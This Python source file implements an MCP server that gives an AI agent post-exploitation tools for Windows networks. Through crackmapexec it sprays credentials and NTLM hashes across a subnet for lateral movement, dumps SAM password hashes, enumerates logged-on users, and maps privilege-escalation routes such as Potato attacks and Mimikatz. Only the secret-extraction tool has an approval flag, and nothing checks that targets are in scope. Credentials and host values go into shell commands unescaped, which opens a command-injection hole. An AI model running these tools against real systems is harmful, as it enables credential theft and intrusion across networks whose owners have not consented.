"""
NTREE Post-Exploitation MCP Server
Handles lateral movement analysis, privilege escalation, and credential extraction
"""

import asyncio
import json
import re
from datetime import datetime
from pathlib import Path
from typing import Any, Optional, List

from mcp.server import Server
from mcp.types import Tool, TextContent
from pydantic import BaseModel, Field

from .utils.command_runner import run_command
from .utils.logger import get_logger, AuditLogger

logger = get_logger(__name__)

app = Server("ntree-post")


# Helper function to handle manual review responses
def handle_command_result(returncode: int, stdout: str, stderr: str, operation: str) -> dict:
    """
    Handle command execution results, including manual review cases.

    Args:
        returncode: Command return code
        stdout: Command stdout
        stderr: Command stderr
        operation: Description of operation (for logging)

    Returns:
        Dict with status and details
    """
    # Check for manual review status (returncode = -2)
    if returncode == -2:
        try:
            manual_review_data = json.loads(stdout)
            logger.warning(f"{operation} requires manual review: {manual_review_data.get('reason')}")

            return {
                "status": "needs_manual_review",
                "operation": operation,
                "reason": manual_review_data.get("reason"),
                "details": manual_review_data.get("details"),
                "recommendation": manual_review_data.get("recommendation"),
                "tool": manual_review_data.get("tool"),
                "safe_alternative": manual_review_data.get("safe_alternative"),
                "original_command": manual_review_data.get("original_command")
            }
        except json.JSONDecodeError:
            return {
                "status": "needs_manual_review",
                "operation": operation,
                "reason": "Interactive tool detected",
                "details": stderr
            }

    # Normal error
    if returncode != 0:
        return {
            "status": "error",
            "error": f"{operation} failed: {stderr[:500]}"
        }

    # Success
    return {
        "status": "success",
        "data": stdout
    }


class AnalyzeTrustArgs(BaseModel):
    """Arguments for analyze_trust tool."""
    host: str = Field(description="Compromised host IP address")
    username: str = Field(description="Valid username on the host")
    password: str = Field(default="", description="Password or leave empty if using hash")
    hash_value: str = Field(default="", description="NTLM hash or leave empty if using password")
    domain: str = Field(default="", description="Domain name (optional, for domain environments)")


class ExtractSecretsArgs(BaseModel):
    """Arguments for extract_secrets tool."""
    host: str = Field(description="Compromised host IP address")
    username: str = Field(description="Valid username with appropriate privileges")
    password: str = Field(default="", description="Password or leave empty if using hash")
    hash_value: str = Field(default="", description="NTLM hash or leave empty if using password")
    secret_types: List[str] = Field(
        default=["passwords", "hashes"],
        description="Types to extract: passwords, hashes, tokens, keys, browser"
    )
    approved: bool = Field(
        default=False,
        description="Explicit approval required (MUST be true to execute)"
    )


class MapPrivilegesArgs(BaseModel):
    """Arguments for map_privileges tool."""
    host: str = Field(description="Target host IP address")
    username: str = Field(description="Valid username on the host")
    password: str = Field(default="", description="Password or leave empty if using hash")
    hash_value: str = Field(default="", description="NTLM hash or leave empty if using password")


@app.list_tools()
async def list_tools() -> list[Tool]:
    """List available post-exploitation tools."""
    return [
        Tool(
            name="analyze_trust",
            description="Analyze trust relationships and identify lateral movement opportunities from a compromised host",
            inputSchema=AnalyzeTrustArgs.model_json_schema()
        ),
        Tool(
            name="extract_secrets",
            description="Extract credentials from a compromised host. REQUIRES EXPLICIT APPROVAL (approved=true). High-risk operation.",
            inputSchema=ExtractSecretsArgs.model_json_schema()
        ),
        Tool(
            name="map_privileges",
            description="Map current user privileges and identify privilege escalation opportunities",
            inputSchema=MapPrivilegesArgs.model_json_schema()
        ),
    ]


@app.call_tool()
async def call_tool(name: str, arguments: Any) -> list[TextContent]:
    """Handle tool invocations."""
    try:
        if name == "analyze_trust":
            args = AnalyzeTrustArgs(**arguments)
            result = await analyze_trust(
                args.host,
                args.username,
                args.password,
                args.hash_value,
                args.domain
            )
            return [TextContent(type="text", text=json.dumps(result, indent=2))]

        elif name == "extract_secrets":
            args = ExtractSecretsArgs(**arguments)
            result = await extract_secrets(
                args.host,
                args.username,
                args.password,
                args.hash_value,
                args.secret_types,
                args.approved
            )
            return [TextContent(type="text", text=json.dumps(result, indent=2))]

        elif name == "map_privileges":
            args = MapPrivilegesArgs(**arguments)
            result = await map_privileges(
                args.host,
                args.username,
                args.password,
                args.hash_value
            )
            return [TextContent(type="text", text=json.dumps(result, indent=2))]

        else:
            error_result = {"status": "error", "error": f"Unknown tool: {name}"}
            return [TextContent(type="text", text=json.dumps(error_result, indent=2))]

    except Exception as e:
        logger.error(f"Error in call_tool({name}): {e}", exc_info=True)
        error_result = {"status": "error", "error": str(e)}
        return [TextContent(type="text", text=json.dumps(error_result, indent=2))]


async def analyze_trust(
    host: str,
    username: str,
    password: str = "",
    hash_value: str = "",
    domain: str = ""
) -> dict:
    """
    Analyze trust relationships and lateral movement opportunities.

    Args:
        host: Compromised host IP
        username: Valid username
        password: Password (or empty if using hash)
        hash_value: NTLM hash (or empty if using password)
        domain: Domain name (optional)

    Returns:
        {
            "status": "success",
            "host": "192.168.1.10",
            "lateral_paths": [
                {
                    "target_host": "192.168.1.20",
                    "target_name": "DC01",
                    "method": "pass_the_hash",
                    "likelihood": "high",
                    "requirements": "Admin access on source",
                    "services": ["smb", "wmi"]
                }
            ],
            "accessible_shares": [...],
            "domain_info": {...},
            "reachable_hosts": [...]
        }
    """
    try:
        logger.info(f"Analyzing trust relationships from {host}")

        result = {
            "status": "success",
            "host": host,
            "username": username,
            "lateral_paths": [],
            "accessible_shares": [],
            "domain_info": {},
            "reachable_hosts": [],
            "credentials_reusable": False,
        }

        # Build credential string for crackmapexec
        if hash_value:
            cred_string = f"-u '{username}' -H '{hash_value}'"
        else:
            cred_string = f"-u '{username}' -p '{password}'"

        if domain:
            cred_string += f" -d '{domain}'"

        # 1. Check access level on current host
        access_level = await _check_access_level(host, cred_string)
        result['access_level'] = access_level

        # 2. Enumerate accessible shares
        shares = await _enumerate_accessible_shares(host, cred_string)
        result['accessible_shares'] = shares

        # 3. Check if we're in a domain
        domain_info = await _get_domain_info(host, cred_string)
        result['domain_info'] = domain_info

        # 4. Test credential reuse on discovered hosts (requires prior scan data)
        # For now, we'll test on common targets
        reachable = await _test_lateral_movement(host, cred_string)
        result['lateral_paths'] = reachable['lateral_paths']
        result['reachable_hosts'] = reachable['hosts']

        # 5. Check for specific attack paths
        if access_level == "admin":
            result['lateral_paths'].extend([
                {
                    "target_host": "Any domain-joined host",
                    "method": "PSExec",
                    "likelihood": "high",
                    "requirements": "Admin credentials",
                    "description": "Can execute commands on remote hosts via PSExec"
                },
                {
                    "target_host": "Any domain-joined host",
                    "method": "WMI",
                    "likelihood": "high",
                    "requirements": "Admin credentials",
                    "description": "Can execute commands via WMI"
                }
            ])

        summary = f"Found {len(result['lateral_paths'])} lateral movement paths, " \
                  f"{len(result['accessible_shares'])} accessible shares, " \
                  f"{len(result['reachable_hosts'])} reachable hosts"

        result['summary'] = summary

        logger.info(f"Trust analysis complete: {summary}")

        return result

    except Exception as e:
        logger.error(f"Error analyzing trust on {host}: {e}", exc_info=True)
        return {
            "status": "error",
            "error": str(e)
        }


async def _check_access_level(host: str, cred_string: str) -> str:
    """Check if user has admin access."""
    try:
        command = f"crackmapexec smb {host} {cred_string}"
        returncode, stdout, stderr = await run_command(command, timeout=60)

        if '(Pwn3d!)' in stdout:
            return "admin"
        elif '[+]' in stdout:
            return "user"
        else:
            return "unknown"

    except Exception as e:
        logger.warning(f"Error checking access level: {e}")
        return "unknown"


async def _enumerate_accessible_shares(host: str, cred_string: str) -> list:
    """Enumerate accessible shares."""
    shares = []

    try:
        command = f"crackmapexec smb {host} {cred_string} --shares"
        returncode, stdout, stderr = await run_command(command, timeout=120)

        if returncode == 0:
            # Parse crackmapexec share output
            for line in stdout.split('\n'):
                if 'READ' in line or 'WRITE' in line:
                    # Extract share name and permissions
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part in ['READ', 'WRITE']:
                            if i > 0:
                                share_name = parts[i-1]
                                permissions = part
                                shares.append({
                                    "name": share_name,
                                    "permissions": permissions
                                })

    except Exception as e:
        logger.warning(f"Error enumerating shares: {e}")

    return shares


async def _get_domain_info(host: str, cred_string: str) -> dict:
    """Get domain information if in domain environment."""
    domain_info = {
        "in_domain": False,
        "domain_name": "",
        "domain_controller": "",
    }

    try:
        command = f"crackmapexec smb {host} {cred_string}"
        returncode, stdout, stderr = await run_command(command, timeout=60)

        # Parse for domain information
        for line in stdout.split('\n'):
            if 'domain:' in line.lower():
                match = re.search(r'domain:(\S+)', line, re.IGNORECASE)
                if match:
                    domain_info['in_domain'] = True
                    domain_info['domain_name'] = match.group(1)

    except Exception as e:
        logger.warning(f"Error getting domain info: {e}")

    return domain_info


async def _test_lateral_movement(source_host: str, cred_string: str) -> dict:
    """Test credential reuse for lateral movement."""
    result = {
        "lateral_paths": [],
        "hosts": []
    }

    try:
        # Try to get network information
        # Note: In real implementation, this would use data from previous scans
        # For now, we'll test the current subnet

        # Extract IP for subnet calculation
        ip_parts = source_host.split('.')
        if len(ip_parts) == 4:
            subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

            # Test credential reuse on subnet
            command = f"crackmapexec smb {subnet} {cred_string} --timeout 5"
            returncode, stdout, stderr = await run_command(command, timeout=180)

            if returncode == 0:
                # Parse successful authentications
                for line in stdout.split('\n'):
                    if '[+]' in line or '(Pwn3d!)' in line:
                        # Extract host IP
                        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if ip_match:
                            target_ip = ip_match.group(1)

                            if target_ip != source_host:
                                result['hosts'].append(target_ip)

                                # Determine method and likelihood
                                method = "pass_the_hash" if "hash" in cred_string.lower() else "credential_reuse"
                                likelihood = "high" if '(Pwn3d!)' in line else "medium"

                                result['lateral_paths'].append({
                                    "target_host": target_ip,
                                    "method": method,
                                    "likelihood": likelihood,
                                    "requirements": "Same credentials work",
                                    "services": ["smb"]
                                })

    except Exception as e:
        logger.warning(f"Error testing lateral movement: {e}")

    return result


async def extract_secrets(
    host: str,
    username: str,
    password: str = "",
    hash_value: str = "",
    secret_types: List[str] = None,
    approved: bool = False
) -> dict:
    """
    Extract credentials from compromised host.

    CRITICAL: This is a HIGH-RISK operation that REQUIRES explicit approval.

    Args:
        host: Target host IP
        username: Valid username with admin privileges
        password: Password (or empty if using hash)
        hash_value: NTLM hash (or empty if using password)
        secret_types: Types to extract
        approved: MUST be True to execute

    Returns:
        {
            "status": "success",
            "host": "192.168.1.10",
            "credentials": [...],
            "hashes": [...],
            "tokens": [...],
            "summary": "..."
        }
    """
    try:
        # CRITICAL: Require explicit approval
        if not approved:
            logger.warning(f"Secret extraction on {host} DENIED - approval required")
            return {
                "status": "error",
                "error": "APPROVAL REQUIRED",
                "message": "Secret extraction is a high-risk operation. "
                          "Set approved=true to explicitly authorize this action.",
                "host": host
            }

        logger.warning(f"SECRET EXTRACTION APPROVED on {host} by operator")

        result = {
            "status": "success",
            "host": host,
            "credentials": [],
            "hashes": [],
            "tokens": [],
            "keys": [],
        }

        if secret_types is None:
            secret_types = ["passwords", "hashes"]

        # Build credential string
        if hash_value:
            cred_string = f"-u '{username}' -H '{hash_value}'"
        else:
            cred_string = f"-u '{username}' -p '{password}'"

        # Extract secrets based on type
        if "hashes" in secret_types:
            logger.info(f"Extracting password hashes from {host}")
            hashes = await _extract_hashes(host, cred_string)
            result['hashes'] = hashes

        if "passwords" in secret_types:
            logger.info(f"Attempting to extract plaintext passwords from {host}")
            passwords = await _extract_passwords(host, cred_string)
            result['credentials'] = passwords

        if "tokens" in secret_types:
            logger.info(f"Enumerating tokens on {host}")
            tokens = await _enumerate_tokens(host, cred_string)
            result['tokens'] = tokens

        summary = f"Extracted {len(result['hashes'])} hashes, " \
                  f"{len(result['credentials'])} credentials, " \
                  f"{len(result['tokens'])} tokens"

        result['summary'] = summary

        logger.warning(f"Secret extraction complete on {host}: {summary}")

        return result

    except Exception as e:
        logger.error(f"Error extracting secrets from {host}: {e}", exc_info=True)
        return {
            "status": "error",
            "error": str(e)
        }


async def _extract_hashes(host: str, cred_string: str) -> list:
    """Extract password hashes using secretsdump."""
    hashes = []

    try:
        # Use crackmapexec to dump SAM
        command = f"crackmapexec smb {host} {cred_string} --sam"
        returncode, stdout, stderr = await run_command(command, timeout=180)

        if returncode == 0:
            # Parse hash output
            for line in stdout.split('\n'):
                # Look for hash format: username:rid:lmhash:nthash
                if ':' in line and len(line.split(':')) >= 4:
                    parts = line.split(':')
                    if len(parts[0]) > 0 and len(parts[3]) == 32:  # NT hash length
                        hashes.append({
                            "username": parts[0].strip(),
                            "rid": parts[1].strip(),
                            "lm_hash": parts[2].strip(),
                            "nt_hash": parts[3].strip(),
                            "source": "SAM"
                        })

    except Exception as e:
        logger.warning(f"Error extracting hashes: {e}")

    return hashes[:50]  # Limit results


async def _extract_passwords(host: str, cred_string: str) -> list:
    """Attempt to extract plaintext passwords (rarely successful on modern systems)."""
    passwords = []

    try:
        # Note: Modern Windows rarely stores plaintext passwords
        # This is here for completeness but will usually return empty

        logger.warning("Plaintext password extraction rarely works on modern systems")

    except Exception as e:
        logger.warning(f"Error extracting passwords: {e}")

    return passwords


async def _enumerate_tokens(host: str, cred_string: str) -> list:
    """Enumerate logged-in users and their tokens."""
    tokens = []

    try:
        # Use crackmapexec to enumerate logged-in users
        command = f"crackmapexec smb {host} {cred_string} --loggedon-users"
        returncode, stdout, stderr = await run_command(command, timeout=120)

        if returncode == 0:
            # Parse logged-on users
            for line in stdout.split('\n'):
                if 'LoggedOn' in line or 'user:' in line.lower():
                    # Extract username
                    match = re.search(r'user[:\s]+(\S+)', line, re.IGNORECASE)
                    if match:
                        tokens.append({
                            "type": "loggedon_user",
                            "username": match.group(1),
                            "host": host
                        })

    except Exception as e:
        logger.warning(f"Error enumerating tokens: {e}")

    return tokens


async def map_privileges(
    host: str,
    username: str,
    password: str = "",
    hash_value: str = ""
) -> dict:
    """
    Map user privileges and identify privilege escalation opportunities.

    Args:
        host: Target host IP
        username: Valid username
        password: Password (or empty if using hash)
        hash_value: NTLM hash (or empty if using password)

    Returns:
        {
            "status": "success",
            "host": "192.168.1.10",
            "current_user": "user1",
            "groups": ["Users", "Remote Desktop Users"],
            "is_admin": false,
            "privileges": [...],
            "escalation_opportunities": [
                {
                    "method": "SeImpersonatePrivilege",
                    "difficulty": "medium",
                    "description": "User has SeImpersonate privilege (potato attack)",
                    "tool": "JuicyPotato"
                }
            ]
        }
    """
    try:
        logger.info(f"Mapping privileges for {username}@{host}")

        result = {
            "status": "success",
            "host": host,
            "current_user": username,
            "groups": [],
            "is_admin": False,
            "privileges": [],
            "escalation_opportunities": [],
        }

        # Build credential string
        if hash_value:
            cred_string = f"-u '{username}' -H '{hash_value}'"
        else:
            cred_string = f"-u '{username}' -p '{password}'"

        # 1. Check if user is admin
        is_admin = await _check_access_level(host, cred_string)
        result['is_admin'] = (is_admin == "admin")

        # 2. Get user groups
        groups = await _get_user_groups(host, cred_string, username)
        result['groups'] = groups

        # 3. Get user privileges (Windows)
        privileges = await _get_user_privileges(host, cred_string)
        result['privileges'] = privileges

        # 4. Identify escalation opportunities
        escalation = await _identify_privesc_opportunities(
            host,
            cred_string,
            is_admin == "admin",
            groups,
            privileges
        )
        result['escalation_opportunities'] = escalation

        summary = f"User: {username}, Admin: {result['is_admin']}, " \
                  f"Groups: {len(groups)}, " \
                  f"Escalation paths: {len(escalation)}"

        result['summary'] = summary

        logger.info(f"Privilege mapping complete: {summary}")

        return result

    except Exception as e:
        logger.error(f"Error mapping privileges on {host}: {e}", exc_info=True)
        return {
            "status": "error",
            "error": str(e)
        }


async def _get_user_groups(host: str, cred_string: str, username: str) -> list:
    """Get user group memberships."""
    groups = []

    try:
        # Use crackmapexec to get user info
        command = f"crackmapexec smb {host} {cred_string} --users"
        returncode, stdout, stderr = await run_command(command, timeout=120)

        if returncode == 0:
            # Parse group information
            in_user_section = False
            for line in stdout.split('\n'):
                if username in line:
                    in_user_section = True

                if in_user_section and 'group' in line.lower():
                    # Extract group names
                    match = re.search(r'group[:\s]+(\S+)', line, re.IGNORECASE)
                    if match:
                        groups.append(match.group(1))

    except Exception as e:
        logger.warning(f"Error getting user groups: {e}")

    # Default groups if we couldn't enumerate
    if not groups:
        groups = ["Users"]

    return groups


async def _get_user_privileges(host: str, cred_string: str) -> list:
    """Get user privileges (Windows-specific)."""
    privileges = []

    try:
        # Try to execute 'whoami /priv' via crackmapexec
        command = f"crackmapexec smb {host} {cred_string} -x 'whoami /priv'"
        returncode, stdout, stderr = await run_command(command, timeout=60)

        if returncode == 0:
            # Parse privilege output
            for line in stdout.split('\n'):
                if 'Se' in line and 'Privilege' in line:
                    # Extract privilege name
                    match = re.search(r'(Se\S+Privilege)', line)
                    if match:
                        priv_name = match.group(1)
                        enabled = 'Enabled' in line
                        privileges.append({
                            "name": priv_name,
                            "enabled": enabled
                        })

    except Exception as e:
        logger.warning(f"Error getting privileges: {e}")

    return privileges


async def _identify_privesc_opportunities(
    host: str,
    cred_string: str,
    is_admin: bool,
    groups: list,
    privileges: list
) -> list:
    """Identify privilege escalation opportunities."""
    opportunities = []

    # Already admin - no escalation needed
    if is_admin:
        return opportunities

    # Check for dangerous privileges
    dangerous_privs = {
        "SeImpersonatePrivilege": {
            "method": "Token Impersonation",
            "difficulty": "medium",
            "description": "User has SeImpersonate privilege (Potato attacks)",
            "tools": ["JuicyPotato", "PrintSpoofer", "RoguePotato"]
        },
        "SeAssignPrimaryTokenPrivilege": {
            "method": "Token Manipulation",
            "difficulty": "medium",
            "description": "User can assign primary tokens",
            "tools": ["Token manipulation tools"]
        },
        "SeBackupPrivilege": {
            "method": "Backup Operators",
            "difficulty": "easy",
            "description": "User can backup files (read SAM/SYSTEM)",
            "tools": ["reg save", "robocopy"]
        },
        "SeRestorePrivilege": {
            "method": "Restore Operators",
            "difficulty": "easy",
            "description": "User can restore files (write anywhere)",
            "tools": ["File manipulation"]
        },
        "SeDebugPrivilege": {
            "method": "Debug Privilege",
            "difficulty": "easy",
            "description": "User can debug processes (memory access)",
            "tools": ["Mimikatz", "Process Hacker"]
        }
    }

    for priv in privileges:
        priv_name = priv.get('name', '')
        if priv_name in dangerous_privs and priv.get('enabled'):
            info = dangerous_privs[priv_name]
            opportunities.append({
                "method": info['method'],
                "difficulty": info['difficulty'],
                "description": info['description'],
                "tools": info['tools'],
                "privilege": priv_name
            })

    # Check for specific group memberships
    privileged_groups = ["Backup Operators", "Server Operators", "Account Operators"]
    for group in groups:
        if any(priv_group.lower() in group.lower() for priv_group in privileged_groups):
            opportunities.append({
                "method": "Privileged Group Membership",
                "difficulty": "easy",
                "description": f"User is member of {group}",
                "tools": ["Group-specific exploits"]
            })

    # Check for common Windows misconfigurations
    # (In real implementation, would run additional checks)
    opportunities.append({
        "method": "Service Misconfiguration",
        "difficulty": "varies",
        "description": "Check for writable service binaries or weak service permissions",
        "tools": ["PowerUp", "winPEAS", "accesschk"]
    })

    return opportunities


def main():
    """Main entry point for post-exploitation server."""
    import sys

    if len(sys.argv) > 1:
        if sys.argv[1] == "--version":
            print("ntree-post v2.0.0")
            return
        elif sys.argv[1] == "--test":
            print("NTREE Post-Exploitation Server - Test Mode")
            return

    async def run_server():
        from mcp.server.stdio import stdio_server

        async with stdio_server() as (read_stream, write_stream):
            await app.run(
                read_stream,
                write_stream,
                app.create_initialization_options()
            )

    asyncio.run(run_server())


if __name__ == "__main__":
    main()
